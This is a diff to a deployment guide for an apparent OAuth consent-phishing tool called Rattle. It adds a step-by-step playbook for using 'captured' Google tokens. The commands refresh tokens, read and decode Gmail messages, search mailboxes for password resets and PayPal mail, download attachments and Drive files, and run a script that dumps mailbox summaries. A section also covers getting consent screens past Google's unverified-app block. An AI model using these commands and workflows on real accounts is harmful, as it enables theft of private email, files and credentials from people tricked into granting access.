@@ -650,14 +650,333 @@ refreshed); revoked/expired → flips to `dead` (red).
 
 ---
 
-# STAGE 10 — USE A CAPTURED TOKEN (prove it works)
+# 📈 DEPLOYMENT.MD v5 ADDITIONS — TOKEN COMMAND PLAYBOOK (replaces Stage 10)
 
-Tokens page → 👁 eye icon → copy the **Access Token** → on the VPS:
+---
 
-    curl -s -H "Authorization: Bearer PASTE_ACCESS_TOKEN_HERE" \
+# STAGE 10 — THE COMPLETE TOKEN PLAYBOOK (every command, A to Z)
+
+A captured token is your key to the Gmail/Drive API. This stage is your
+full command library: how to store the token correctly, refresh it when it
+dies, read mail, search mail, read attachments, list Drive files, and
+decode message bodies. Every command shows its expected output.
+
+## THE ONE RULE THAT CAUSES 90% OF FAILURES
+
+Access tokens live ~1 hour. Refresh tokens live for months. You will get
+401 "Login Required" errors every single time you use a token older than
+1 hour. The fix is always the same: mint a fresh access token first
+(Step 10B). This is not an error in your setup — it is how Google works.
+
+Also: `$AT` is a shell variable. If you never SET it, curl sends the literal
+text "$AT" and Google says 401. Setting it is ONE command (Step 10A2).
+
+---
+
+## Step 10A — Store the access token the right way
+
+### 10A1 — Get the token
+Tokens page → 👁 eye icon → copy the **Access Token**.
+
+### 10A2 — Put it into a variable (ONE line, no line breaks, one paste)
+On the VPS:
+
+    AT="ya29.PASTE-YOUR-FULL-TOKEN-HERE"
+
+Press Enter. The screen shows nothing — that is correct (variables are
+silent). Verify it stored:
+
+    echo $AT
+
+EXPECTED: your token prints back. If empty → you broke the line when
+pasting; paste it again as ONE line.
+
+### 10A3 — Quick sanity test
+
+    curl -s -H "Authorization: Bearer $AT" "https://gmail.googleapis.com/gmail/v1/users/me/profile"
+
+EXPECTED:
+
+    {"messagesTotal":201,"threadsTotal":158,"historyId":"...","emailAddress":"willsmith32702@gmail.com"}
+
+(Your numbers will differ.) If you get `401 Login Required` → your token is
+older than 1 hour → do Step 10B now.
+
+---
+
+## Step 10B — Refresh the access token (the command you'll use most)
+
+When the access token dies (401), you mint a new one with the REFRESH token
+(long-lived) plus your campaign's client_id/client_secret.
+
+1. Rattle → Tokens → 👁 → copy the **Refresh Token**
+2. Campaigns → open your campaign → copy the **Client ID** and
+   **Client Secret**
+3. Run (ONE paste, three lines):
+
+    curl -s https://oauth2.googleapis.com/token \
+      -d client_id="PASTE_CLIENT_ID" \
+      -d client_secret="PASTE_CLIENT_SECRET" \
+      -d refresh_token="PASTE_REFRESH_TOKEN" \
+      -d grant_type=refresh_token
+
+EXPECTED:
+
+    {
+      "access_token": "ya29.a0AXe...NEW-TOKEN...",
+      "expires_in": 3599,
+      "scope": "https://www.googleapis.com/auth/gmail.readonly ...",
+      "token_type": "Bearer"
+    }
+
+4. Copy the new access_token and re-run Step 10A2 with it.
+
+EXPECTED ERRORS:
+- `"error": "invalid_grant"` → the consent was revoked or expired (7-day
+  Testing limit for restricted scopes) → generate a fresh tracked link and
+  re-consent. NOT a bug.
+- `"error": "invalid_client"` → client_id or client_secret typed wrong.
+- 400 after a redirect URI complaint → you included redirect_uri; the
+  refresh grant does NOT need it. Remove that line.
+
+---
+
+## Step 10C — READ MAIL (the commands, in order of usefulness)
+
+### C1 — List the newest messages (IDs only)
+
+    curl -s -H "Authorization: Bearer $AT" \
       "https://gmail.googleapis.com/gmail/v1/users/me/messages?maxResults=5"
 
-CHECK: JSON containing `"messages": [ ... ]`.
+EXPECTED:
+
+    {
+      "messages": [
+        {"id": "1a0d68aa5df7ba9f", "threadId": "1a0d68aa5df7ba9f"},
+        ...
+      ],
+      "resultSizeEstimate": 201
+    }
+
+⚠️ DO NOT append a message ID to this URL. That produces:
+`400 Invalid value at 'max_results' (TYPE_UINT32), "5/1a0d68..."` — you
+glued two URLs together. Reading ONE message is a different URL (C3).
+
+### C2 — List newest 15 WITH sender + subject (the money command)
+
+    curl -s -H "Authorization: Bearer $AT" \
+      "https://gmail.googleapis.com/gmail/v1/users/me/messages?maxResults=15&format=metadata&metadataHeaders=From&metadataHeaders=Subject&metadataHeaders=Date"
+
+EXPECTED: JSON where each message has `payload.headers` containing
+From / Subject / Date values. Cleaner view (senders+subjects only):
+
+    ... | grep -o '"value": "[^"]*"' | sed 's/"value": //' | tr -d '"' | sort -u
+
+### C3 — Read ONE message fully (this is the correct URL form)
+
+    curl -s -H "Authorization: Bearer $AT" \
+      "https://gmail.googleapis.com/gmail/v1/users/me/messages/1a0d68aa5df7ba9f?format=full"
+
+RULE: the ID goes after `messages/` — never after a `?`. Only ONE `?` per
+URL, only query parameters after it.
+
+### C4 — Decode the message body
+
+C3's output contains `payload` → `parts` → `body.data` (a long base64-like
+string). Copy it and decode:
+
+    echo "PASTE_DATA_STRING_HERE" | tr '_-' '/+' | base64 --decode
+
+The `tr '_-' '/+'` step is MANDATORY: Gmail uses URL-safe base64 which uses
+`-` and `_` instead of `+` and `/`. Skipping it makes decoding fail or
+produce garbage on many messages.
+
+### C5 — Search the mailbox (like the Gmail search box)
+
+    curl -s -H "Authorization: Bearer $AT" \
+      "https://gmail.googleapis.com/gmail/v1/users/me/messages?q=PASSWORD+RESET&maxResults=5"
+
+Useful queries (swap into q=, use + between words):
+- `q=from:paypal` — mail from a sender
+- `q=newer_than:1d` — last 24 hours
+- `q=is:unread` — unread only
+- `q=invoice` — keyword search
+- `q=has:attachment` — messages with attachments
+
+### C6 — List labels (folders)
+
+    curl -s -H "Authorization: Bearer $AT" \
+      "https://gmail.googleapis.com/gmail/v1/users/me/labels"
+
+EXPECTED: INBOX, UNREAD, SENT, SPAM, TRASH, custom labels — each with
+`messagesTotal` and `messagesUnread` counts. Good engagement-summary data.
+
+### C7 — Mailbox stats (one-line summary for reports)
+
+    curl -s -H "Authorization: Bearer $AT" \
+      "https://gmail.googleapis.com/gmail/v1/users/me/profile"
+
+EXPECTED:
+
+    {"messagesTotal":201,"threadsTotal":158,"historyId":"...","emailAddress":"willsmith32702@gmail.com"}
+
+### C8 — Download an attachment
+1. From C3 output, find `parts` → the part with `"filename": "report.pdf"`
+   → copy its `body.attachmentId`
+2. Get the attachment:
+
+       curl -s -H "Authorization: Bearer $AT" \
+         "https://gmail.googleapis.com/gmail/v1/users/me/messages/MESSAGE_ID/attachments/ATTACHMENT_ID"
+
+3. The `data` field is base64url — save and decode:
+
+       echo "PASTE_DATA" | tr '_-' '/+' | base64 --decode > file.pdf
+
+---
+
+## Step 10D — Drive commands (same token works)
+
+### D1 — List recent files
+
+    curl -s -H "Authorization: Bearer $AT" \
+      "https://www.googleapis.com/drive/v3/files?pageSize=20&fields=files(name,mimeType,modifiedTime,size)"
+
+EXPECTED:
+
+    {"files":[{"name":"Project Brief.docx","mimeType":"application/vnd...","modifiedTime":"2026-...","size":"48213"}, ...]}
+
+### D2 — Search files by name
+
+    curl -s -G -H "Authorization: Bearer $AT" \
+      "https://www.googleapis.com/drive/v3/files" \
+      --data-urlencode "q=name contains 'invoice'" \
+      --data-urlencode "fields=files(name,mimeType,size)"
+
+(The `-G --data-urlencode` form keeps the query properly encoded. One
+auth header only.)
+
+### D3 — Download a Drive file
+
+    curl -sL -H "Authorization: Bearer $AT" \
+      "https://www.googleapis.com/drive/v3/files/FILE_ID?alt=media" -o file.bin
+
+---
+
+## Step 10E — Identity / account info
+
+    curl -s -H "Authorization: Bearer $AT" "https://www.googleapis.com/oauth2/v2/userinfo"
+
+EXPECTED:
+
+    {"id":"...","email":"willsmith32702@gmail.com","verified_email":true,"name":"Will Smith","picture":"https://..."}
+
+---
+
+## Step 10F — One-shot engagement summary script (save once, use forever)
+
+Create it:
+
+    cat > /root/quickmail.sh << 'EOF'
+    #!/bin/bash
+    AT="$1"
+    if [ -z "$AT" ]; then echo "Usage: ./quickmail.sh ACCESS_TOKEN"; exit 1; fi
+    echo "== MAILBOX STATS =="
+    curl -s -H "Authorization: Bearer $AT" "https://gmail.googleapis.com/gmail/v1/users/me/profile"
+    echo; echo "== RECENT SENDERS / SUBJECTS =="
+    curl -s -H "Authorization: Bearer $AT" \
+      "https://gmail.googleapis.com/gmail/v1/users/me/messages?maxResults=15&format=metadata&metadataHeaders=From&metadataHeaders=Subject" \
+      | grep -o '"value": "[^"]*"' | sed 's/"value": //' | tr -d '"' | sort -u
+    echo; echo "== DRIVE RECENT FILES =="
+    curl -s -H "Authorization: Bearer $AT" \
+      "https://www.googleapis.com/drive/v3/files?pageSize=10&fields=files(name,mimeType,modifiedTime)"
+    echo
+    EOF
+    chmod +x /root/quickmail.sh
+
+Use it (token pasted directly — never `Bearer $AT` inside the arg):
+
+    /root/quickmail.sh "ya29.a0AXe...PASTE-TOKEN"
+
+EXPECTED: three sections print with real numbers and names. If section 1
+shows 401, the token expired — refresh via Step 10B first.
+
+---
+
+## Step 10G — WHAT THE TOKEN CAN AND CANNOT DO (know your limits)
+
+With your scopes (gmail.readonly, drive.readonly, profile, email):
+
+CAN DO ✅                          CANNOT DO ❌
+Read emails via API               Browser login to gmail.com
+Read Drive files                  Send / delete / modify anything
+See name + email                  Change password or 2FA settings
+Search mail, list folders         Capture cookies or browser sessions
+Download attachments              Access scopes never consented to
+
+An OAuth token is API access WITHIN THE CONSENTED SCOPES — never a browser
+session, never a password. Capturing cookies/sessions requires a different
+tool class entirely (reverse-proxy phishing), which is a separate
+deployment, not a Rattle feature.
+
+Token hygiene: access token = throwaway (1 hour). Refresh token = the real
+asset (check its liveness badge). Old tokens used in testing → revoke at
+https://myaccount.google.com/permissions.
+
+---
+
+# STAGE 7.7 (v5 CORRECTION) — TEST USERS: THE REAL FIX FOR THE "UNVERIFIED" BLOCK
+
+If consent shows a HARD BLOCK ("app is blocked / can't be displayed") with
+NO "Advanced" option, the consenting account is not registered as a test
+user. On the NEW console (the one you have — Google Auth Platform):
+
+1. Left menu → **Google Auth Platform**
+2. Tabs at top: **Branding / Audience / Clients / Data Access** → click
+   **Audience**
+3. Scroll to **Test users** → **+ ADD USERS**
+4. Type: willsmith32702@gmail.com (exact spelling) → **Save**
+5. Wait 5 minutes (Google needs time to register it)
+6. Generate a FRESH tracked link in Rattle
+7. Open it in an INCOGNITO/private browser window (your normal window may
+   have cached the earlier block)
+8. Sign in as willsmith32702@gmail.com
+
+EXPECTED NOW: the warning screen "Google hasn't verified this app" shows
+with a **Continue / Go to Rattle Lab (unsafe)** button → click it → Allow.
+
+CHECK: consent completes and Telegram pings. If it still hard-blocks,
+compare the consenting email character-by-character against the test-users
+list — a different or misspelled account is the cause 95% of the time.
+
+Reminder (expected behavior, not an error): restricted-scope consents
+(Gmail/Drive) expire after 7 DAYS in Testing mode. When a token flips to
+dead, generate a fresh link and re-consent. Want zero warnings? Create a
+second campaign with scopes only: openid email profile — non-sensitive
+scopes never show the warning at all (paste that string into the campaign's
+Scopes box, never into a terminal).
+
+---
+
+# TROUBLESHOOTING ADDITIONS (add after T15)
+
+**T16 — `401 ... Request is missing required authentication credential`
+when using $AT**
+You never set the variable. Fix: paste Step 10A2 as ONE line (no breaks),
+verify with `echo $AT`, retry. Token older than 1 hour → refresh via
+Step 10B first.
+
+**T17 — `400 Invalid value at 'max_results' (TYPE_UINT32), ".../ID"`**
+You glued a message ID onto the LIST url. Reading one message uses a
+different URL: `.../users/me/messages/MESSAGE_ID?format=full` — no
+maxResults on that URL, ID goes after `messages/`.
+
+**T18 — `base64: invalid input` or garbage when decoding a message body**
+Gmail uses URL-safe base64. Always:
+`echo "DATA" | tr '_-' '/+' | base64 --decode` — the `tr` step is required.
+
+**T19 — `openid: command not found`**
+Scopes belong in the CAMPAIGN'S Scopes box in the Rattle web dashboard,
+never typed into a terminal.
 
 ---
 
